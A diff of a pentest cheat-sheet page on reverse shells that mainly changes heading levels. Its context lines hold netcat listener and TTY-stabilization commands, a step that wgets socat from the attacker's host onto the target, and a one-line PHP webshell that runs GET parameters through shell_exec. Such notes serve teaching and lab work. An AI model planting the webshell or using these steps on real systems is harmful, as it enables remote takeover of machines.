@@ -4,11 +4,11 @@ category:
 ---
 !!! info "Info"
 	"Reverse shells _allow attackers to open ports to the target machines, forcing communication and_ enabling a complete takeover of the target machine." -[Imperva](https://www.imperva.com/learn/application-security/reverse-shell/)
-# Stabilization
-## TTY Size
+## Stabilization
+### TTY Size
 In second terminal window, get rows & columns with `stty -a`, then set them in the remote shell with `stty {rows|cols} <number>`
 
-## Netcat
+### Netcat
 Rlwrap: `rlwrap nc -lvnp <port>`
 If Python is available:
 ```bash
@@ -18,7 +18,7 @@ export TERM=xterm
 [Ctrl+Z]    # background the session
 stty raw -echo; fg     # Stabilze and foreground the shell
 ```
-## Socat
+### Socat
 If Python is available:
 ```
 # Start Python webserver on local machine
@@ -29,7 +29,7 @@ sudo nc -lvnp <port>
 wget \{local IP}/socat -O /tmp/socat
 ```
 
-# Basic Webshell
+## Basic Webshell
 ```php
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
 ```
